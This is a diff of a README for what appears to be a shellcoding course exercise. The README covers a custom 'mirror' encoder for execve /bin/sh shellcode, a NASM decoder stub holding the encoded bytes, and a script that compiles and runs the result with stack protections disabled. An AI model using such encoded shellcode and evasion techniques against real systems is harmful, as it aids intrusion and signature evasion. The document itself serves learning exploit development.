@@ -7,7 +7,7 @@
 -PoC with using execve-stack as the shellcode to encode with your schema and execute.
 
 ## Solution: 
-  1) Create a custom encoding scheme like the “Insertion Encoder” we showed you.
+  1) Create the encoder.
   
   The encoder created (Mirror_encoder.py) takes the every 4 bytes of the shellcode and reverse its order, meaning, if the string taken is 0x45a3, the resultant will be 0xa345 (this is done until the end of the shellcode is reached). In case the shellcode has not even length, 0xf0 is added to the end of the shellcode to allow the "mirror" modification. 0xf0f0 is appended to the final shellcode as the marker which will be used to stop the nasm decoder.
   
@@ -24,14 +24,17 @@
 
     print shell2 + "0xf0,0xf0" #Marker to finish the decoder
     
-  2) PoC with using execve-stack as the shellcode to encode with your schema and execute.
-    * The shellcode to be used is the one obtained from the execve-stack binary.
+  2) PoC with using execve-stack as the shellcode to encode.
+  
+   * The shellcode to be used is the one obtained from the execve-stack binary.
     
     nasm -f elf32 -o execve.o execve.nasm
     ld -o execve execve.o
     objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-    
-   * The resultant code must be passed to Mirror_Encoder.py where is "mirrored".
+   
+   3) Create the nasm decoder.
+   
+   * The shellcode obtained in the earlier step, must be passed to Mirror_Encoder.py where is "mirrored".
    
    * Now, we have the shellcode to inject into the Mirror_decoder.nasm
    
@@ -68,38 +71,40 @@
 
     call decoder
     EncodedShellcode: db 0xc0,0x31,0x68,0x50,0x2f,0x2f,0x68,0x73,0x2f,0x68,0x69,0x62,0x89,0x6e,0x50,0xe3,0xe2,0x89,0x89,0x53,0xb0,0xe1,0xcd,0x0b,0xf0,0x80,0xf0,0xf0,0xee,0xee
-             
+
+4) Compiling the final shellcode
+    
    * Once the nasm code is finished, we can use mirror-decoder-compile.sh to assembly and link it, copy the shellcode to the skeleton_shellcode.c, compile the final shellcode and execute it.
    
-    echo '[+] Assembling with Nasm ... '
-    nasm -f elf32 -o mirror-decode.o mirror-decode.nasm
+          echo '[+] Assembling with Nasm ... '
+          nasm -f elf32 -o mirror-decode.o mirror-decode.nasm
 
-    echo '[+] Linking ...'
-    ld -o mirror-decode mirror-decode.o
+          echo '[+] Linking ...'
+          ld -o mirror-decode mirror-decode.o
 
-    echo '[+] Done!'
+          echo '[+] Done!'
 
-    sleep 2
+          sleep 2
 
-    echo "[+] Dumping disassembling code.."
+          echo "[+] Dumping disassembling code.."
 
-    objdump=$(objdump -d ./mirror-decode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
+          objdump=$(objdump -d ./mirror-decode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
 
-    echo $objdump 
-    sleep 3
+          echo $objdump 
+          sleep 3
 
-    echo "[+] Compiling shellcode.c and executing it.."
+          echo "[+] Compiling shellcode.c and executing it.."
 
-    cp skeleton_shellcode.c shellcode.c  #Copy the skeleton of the shellcode (it contais a string named shellcode which it will be replaced with objdump)
+          cp skeleton_shellcode.c shellcode.c  #Copy the skeleton of the shellcode (it contais a string named shellcode which it will be replaced with objdump)
 
-    replace "shellcode" "$objdump" -- shellcode.c &>/dev/null #Replace shellcode dump
+          replace "shellcode" "$objdump" -- shellcode.c &>/dev/null #Replace shellcode dump
 
-    sleep 2
+          sleep 2
 
-    gcc -fno-stack-protector -z execstack shellcode.c -o shellcode &>/dev/null #Compile and execute the shellcode
+          gcc -fno-stack-protector -z execstack shellcode.c -o shellcode &>/dev/null #Compile and execute the shellcode
 
 
-    ./shellcode
-    
-   
+          ./shellcode
+
+
       
